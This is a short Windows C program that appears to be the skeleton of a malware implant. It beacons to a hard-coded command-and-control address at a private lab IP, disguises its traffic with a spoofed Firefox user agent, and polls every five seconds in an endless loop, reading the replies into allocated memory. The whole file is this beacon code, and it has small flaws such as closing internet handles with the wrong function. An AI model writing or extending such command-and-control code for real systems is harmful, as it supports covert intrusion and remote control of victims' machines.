#include "windows.h"
#include "wininet.h"

#define FAIL 0
#define SUCCESS 1

#define C2 "http://192.168.56.1:8080"
#define UA "Firefox ... "

#define MAX_BUFFER 0x4096
#define INTERVAL 5 * 1000

int 
main(void){
//DWORD 
//go(void) {

  DWORD dw_success = 0x00, dw_read = 0x00;
  LPVOID ptr_buffer;

  HINTERNET h_internet, h_url;

  h_internet = InternetOpenA(UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (h_internet == NULL)
    goto exit;

  ptr_buffer = VirtualAlloc(0, MAX_BUFFER, MEM_COMMIT, PAGE_READWRITE);
  if(ptr_buffer == NULL)
    goto exit;

  while ( 1 ) {

    h_url = InternetOpenUrlA(h_internet, C2, NULL, 0, 0, 0);
    if (h_url == NULL)
      goto exit;

    InternetReadFile(h_url, ptr_buffer, MAX_BUFFER, &dw_read);

    Sleep(5000);

  }


exit_success:
  dw_success = SUCCESS;
exit:

  if(h_internet)
    CloseHandle(h_internet);

  if(h_url)
    CloseHandle(h_url);

  return dw_success;

}
